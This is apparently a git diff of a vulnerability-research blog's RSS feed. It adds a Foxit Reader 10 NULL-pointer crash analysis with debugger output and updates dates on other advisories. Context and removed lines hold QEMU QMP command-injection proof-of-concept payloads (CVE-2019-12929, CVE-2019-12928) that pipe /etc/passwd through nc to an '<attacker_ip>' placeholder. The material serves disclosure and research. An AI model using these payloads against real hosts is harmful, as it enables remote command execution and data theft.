@@ -5,9 +5,150 @@
     <description>Interested in RE and vulnerability research.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>2020-06-03</pubDate>
-    <lastBuildDate>Wed, 03 Jun 2020 18:14:47 +0000</lastBuildDate>
+    <pubDate>2020-06-04</pubDate>
+    <lastBuildDate>Thu, 04 Jun 2020 05:24:49 +0000</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Foxit Reader 10 - NULL Pointer Dereference</title>
+        <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;A &lt;strong&gt;NULL Pointer Dereference&lt;/strong&gt; can be triggered by opening a specially crafted PDF file using &lt;strong&gt;Foxit Reader&lt;/strong&gt; version 10.0.0.35798. The issue was caused by an unchecked pointer in &lt;strong&gt;FoxitReader!safe_vsnprintf&lt;/strong&gt; function. An attacker can trigger a read from address zero which could lead to a process termination or denial of service.&lt;/p&gt;
+
+&lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(1c38.1e00): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=06758a14 edx=0a0d0000 esi=32b98fd0 edi=06758a34
+eip=027fed2e esp=0675899c ebp=06758a0c iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210216
+FoxitReader!safe_vsnprintf+0x9c4ffe:
+027fed2e 8b10            mov     edx,dword ptr [eax]  ds:002b:00000000=????????
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;bug-analysis&quot;&gt;Bug Analysis&lt;/h1&gt;
+
+&lt;p&gt;So this is where the bug was initially triggered. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; is directly obtained after a call to &lt;strong&gt;FoxitReader!safe_vsnprintf+0x9c1b30&lt;/strong&gt; function. There is no check whether the pointer is NULL.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// where null ptr was deref'ed
+027fed10 0f8d3d010000    jge     FoxitReader!safe_vsnprintf+0x9c5123 (027fee53)
+027fed16 c7450800000000  mov     dword ptr [ebp+8],0
+027fed1d 8bce            mov     ecx,esi
+027fed1f c645fc09        mov     byte ptr [ebp-4],9
+
+// directly jump here, skipped the above path
+027fed23 e838cbffff      call    FoxitReader!safe_vsnprintf+0x9c1b30 (027fb860)
+027fed28 8d4d08          lea     ecx,[ebp+8]
+027fed2b 51              push    ecx
+027fed2c 6a00            push    0
+027fed2e 8b10            mov     edx,dword ptr [eax]  ds:002b:00000000=????????
+0216ed30 8bc8            mov     ecx,eax
+0216ed32 ff5208          call    dword ptr [edx+8]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; was a returned value from a call to a function pointer. The function was referenced at a fixed memory address which is &lt;strong&gt;0x04372174&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// call FoxitReader!safe_vsnprintf+0x9e3610, where got checks all over the place
+027fb917 8d4de8          lea     ecx,[ebp-18h]
+027fb91a 51              push    ecx
+027fb91b 8bc8            mov     ecx,eax
+027fb91d 8b10            mov     edx,dword ptr [eax]
+027fb91f ff5210          call    dword ptr [edx+10h]  ds:002b:04372174=0281d340     ; call FoxitReader!safe_vsnprintf+0x9e3610
+027fb922 8bf0            mov     esi,eax 	; store null to esi
+027fb924 8d4df0          lea     ecx,[ebp-10h]
+027fb927 e8447ca2ff      call    FoxitReader!safe_vsnprintf+0x3e9840 (02223570)
+027fb92c 8bc6            mov     eax,esi 	; make sure eax is still null
+027fb92e 8b4df4          mov     ecx,dword ptr [ebp-0Ch]
+027fb931 64890d00000000  mov     dword ptr fs:[0],ecx
+027fb938 59              pop     ecx
+027fb939 5f              pop     edi
+027fb93a 5e              pop     esi
+027fb93b 8be5            mov     esp,ebp
+027fb93d 5d              pop     ebp
+027fb93e c3              ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Inside the &lt;strong&gt;FoxitReader!safe_vsnprintf+0x9e3610&lt;/strong&gt;, we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; register is set to NULL.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// FoxitReader!safe_vsnprintf+0x9e3610:
+0281d340 55              push    ebp
+0281d341 8bec            mov     ebp,esp
+0281d343 6aff            push    0FFFFFFFFh
+0281d345 68f284f203      push    offset FoxitReader!CFXJSE_Arguments::GetValue+0x15b5622 (03f284f2)
+0281d34a 64a100000000    mov     eax,dword ptr fs:[00000000h]
+0281d350 50              push    eax
+0281d351 83ec24          sub     esp,24h
+0281d354 53              push    ebx
+
+// then set eax to null
+0281d449 8b7508          mov     esi,dword ptr [ebp+8]
+0281d44c 837e0402        cmp     dword ptr [esi+4],2
+0281d450 7d20            jge     FoxitReader!safe_vsnprintf+0x9e3742 (0281d472)
+0281d452 33c0            xor     eax,eax 	; set to null
+0281d454 8b4df4          mov     ecx,dword ptr [ebp-0Ch]
+0281d457 64890d00000000  mov     dword ptr fs:[0],ecx
+0281d45e 59              pop     ecx
+0281d45f 5f              pop     edi
+0281d460 5e              pop     esi
+0281d461 5b              pop     ebx
+0281d462 8be5            mov     esp,ebp
+0281d464 5d              pop     ebp
+0281d465 c20400          ret     4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There is a small possibility to gain control of the memory address at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edx+10h&lt;/code&gt; by manipulating the allocated heap but I have not found any tricks to do that yet. So I will just leave it here for the readers.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; !heap -p -a eax
+    address 2f448fc0 found in
+    _DPH_HEAP_ROOT @ b0e1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                2f440958:         2f448fc0               40 -         2f448000             2000
+          ? FoxitReader!google::LogMessage::kMaxLogMessageLen+30e198
+    71cfab70 verifier!AVrfDebugPageHeapAllocate+0x00000240
+    775b909b ntdll!RtlDebugAllocateHeap+0x00000039
+    7750bbad ntdll!RtlpAllocateHeap+0x000000ed
+    7750b0cf ntdll!RtlpAllocateHeapInternal+0x0000022f
+    7750ae8e ntdll!RtlAllocateHeap+0x0000003e
+    0394bb00 FoxitReader!CFXJSE_Arguments::GetValue+0x00fd8c30
+    0222857b FoxitReader!safe_vsnprintf+0x003ee84b
+    02228b06 FoxitReader!safe_vsnprintf+0x003eedd6
+    02228723 FoxitReader!safe_vsnprintf+0x003ee9f3
+    0281b677 FoxitReader!safe_vsnprintf+0x009e1947
+    02808458 FoxitReader!safe_vsnprintf+0x009ce728
+    027fc78f FoxitReader!safe_vsnprintf+0x009c2a5f
+    02827dd3 FoxitReader!safe_vsnprintf+0x009ee0a3
+    02825fe7 FoxitReader!safe_vsnprintf+0x009ec2b7
+    0282659c FoxitReader!safe_vsnprintf+0x009ec86c
+    02824c64 FoxitReader!safe_vsnprintf+0x009eaf34
+    0282571c FoxitReader!safe_vsnprintf+0x009eb9ec
+    028611f3 FoxitReader!safe_vsnprintf+0x00a274c3
+    00a11396 FoxitReader!std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::put+0x00039366
+    00a10f7a FoxitReader!std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::put+0x00038f4a
+    009c9adf FoxitReader!std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::operator&amp;lt;&amp;lt;+0x000eab8f
+    009e1c8f FoxitReader!std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::put+0x00009c5f
+    009e1f45 FoxitReader!std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::put+0x00009f15
+    03678916 FoxitReader!CFXJSE_Arguments::GetValue+0x00d05a46
+    036786f8 FoxitReader!CFXJSE_Arguments::GetValue+0x00d05828
+    03680fa9 FoxitReader!CFXJSE_Arguments::GetValue+0x00d0e0d9
+    0369a6b1 FoxitReader!CFXJSE_Arguments::GetValue+0x00d277e1
+    00bd4eb7 FoxitReader!std::basic_ios&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::fill+0x00028cd7
+    009ec531 FoxitReader!std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::put+0x00014501
+    0367371f FoxitReader!CFXJSE_Arguments::GetValue+0x00d0084f
+    0368106b FoxitReader!CFXJSE_Arguments::GetValue+0x00d0e19b
+    0369a6f4 FoxitReader!CFXJSE_Arguments::GetValue+0x00d27824
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>2020-06-04</pubDate>
+        <link>http://localhost:4000/articles/2020-05/foxit_reader_10_null_deref</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2020-05/foxit_reader_10_null_deref</guid>
+        
+        <category>Foxit Reader 10</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Windows GDI SetEnhMetaFileBits - Out-of-Bounds Read Information Disclosure</title>
@@ -111,7 +252,7 @@ ntdll!memcpy+0x213:
 08 00d7f8c8 00000000 009c1353 7f1c5000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</guid>
         
@@ -160,7 +301,7 @@ ntdll!memcpy+0x213:
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</guid>
         
@@ -228,7 +369,7 @@ ntdll!memcpy+0x213:
 
 &lt;p&gt;Going down the rabbit hole right before the data is insert into the hash table through &lt;strong&gt;emu_hashtable_insert&lt;/strong&gt; at line 70. &lt;strong&gt;emu_hashtable_search&lt;/strong&gt; is called to check whether the data is already inserted or not. At line 96, the address of the key inside the hash table will be divided with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eh-&amp;gt;size&lt;/code&gt; and triggers the bug.&lt;/p&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2020-03/libemu_divide_by_zero</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-03/libemu_divide_by_zero</guid>
         
@@ -349,7 +490,7 @@ index 08e6967dfe1..4b1d988dce2 100644
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</guid>
         
@@ -450,7 +591,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</guid>
         
@@ -505,7 +646,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;corrupt stack?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13614</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13614</guid>
         
@@ -570,7 +711,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13613</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13613</guid>
         
@@ -1944,7 +2085,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2019-06/bhyve_hda_bof</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/bhyve_hda_bof</guid>
         
@@ -1967,37 +2108,9 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'execute':'guest-exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arguments':&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'path':'/bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arg':&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'-c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'cat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/etc/passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;attacker_ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-06-03</pubDate>
+        <pubDate>2020-06-04</pubDate>
         <link>http://localhost:4000/articles/2019-06/CVE-2019-12929</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12929</guid>
-        
-        <category>qemu</category>
-        
-        
-        <category>proof-of-concept</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-12928] QEMU Machine Protocol Migrate Remote Command Execution</title>
-        <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
-&lt;p&gt;The QMP &lt;strong&gt;migrate&lt;/strong&gt; command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
-
-&lt;p&gt;1st, execute the QEMU with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-qmp tcp:&amp;lt;ip_address&amp;gt;:1234,server,nowait&lt;/code&gt;
-2nd, open another console and setup a listener to port 9999
-3rd, connect to the target and enter the following commands:&lt;/p&gt;
-
-&lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof-of-Concept&lt;/h1&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;execute&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qmp_capabilities&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;return&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;execute&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;migrate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;arguments&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;exec:cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;return&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-</description>
-        <pubDate>2020-06-03</pubDate>
-        <link>http://localhost:4000/articles/2019-06/CVE-2019-12928</link>
-        <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12928</guid>
         
         <category>qemu</category>
         
